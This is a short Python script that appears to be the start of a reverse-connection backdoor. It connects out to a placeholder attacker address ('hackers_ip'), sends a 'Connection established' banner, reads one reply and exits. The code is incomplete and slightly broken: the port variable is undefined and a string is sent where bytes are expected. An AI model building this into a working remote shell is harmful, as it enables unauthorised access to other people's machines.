import socket 

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection.connect(("hackers_ip", open_port_no ))

connection.send("\n[+] Connection established.\n")

received_data = connection.recv(1024)

print(received_data)

connection.close()
